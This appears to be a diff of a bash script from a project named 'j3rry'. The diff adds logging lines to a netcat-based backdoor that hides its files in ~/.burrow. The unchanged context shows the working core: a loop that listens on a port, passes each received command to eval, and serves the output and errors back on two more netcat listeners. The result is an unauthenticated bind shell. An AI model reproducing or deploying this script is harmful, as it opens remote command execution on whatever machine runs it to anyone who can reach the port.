@@ -8,36 +8,56 @@ dir="/home/$USER/.burrow"
 outputfile="$dir/j3rry.out"
 errorfile="$dir/j3rry.err"
 
+echo "[S] Input port: $inputport"
+echo "[S] Output port: $outputport"
+echo "[S] Error port: $errorport"
 touch "working.txt"
 echo "J3rry: Sup dawg!" >> "/home/$USER/j3rry.txt"
 
 if [ -f "$outputfile" ]; then
+	echo -n "[S] $outputfile exits, wiping..."
 	echo "" > "$outputfile"
+	echo "Done."
 else
+	echo -n "[S] $outputfile does not exists, creating..."
 	touch "$outputfile"
+	echo "Done."
 fi
 
 
 if [ -f "$errorfile" ]; then
+	echo -n "[S] $errorfile exits, wiping..."
 	echo "" > "$errorfile"
+	echo "Done."
 else
+	echo -n "[S] $errorfile does not exists, creating..."
 	touch "$errorfile"
+	echo "Done."
 fi
 
 
 
 
+echo "[S] Listening on port: $inputport"
 while :
 do
 	while read -r command; do
 
+		echo "[S]Received commad: $command ." 
 		echo -e "[S] Command '$command' output: \n" >"$outputfile"
 		echo -e "[S] Command '$command' error:\n" >"$errorfile"
+		echo "[S] Out & err files set up."
+		echo -n "[S] Executing command... "
 		eval "$command" >"$outputfile" 2>"$errorfile"
+		echo "Done"
+		echo -n "[S] Sending feedback.."
 		cat "$outputfile" | nc -l -p "$outputport" &
 		cat "$errorfile" | nc -l -p "$errorport" & 
 		sleep 2 && pkill -P $$
+		echo "Done"
 	done < <(nc -l -p "$inputport")
 done
+
+echo "[S] Script ended!"
 
 exit 0
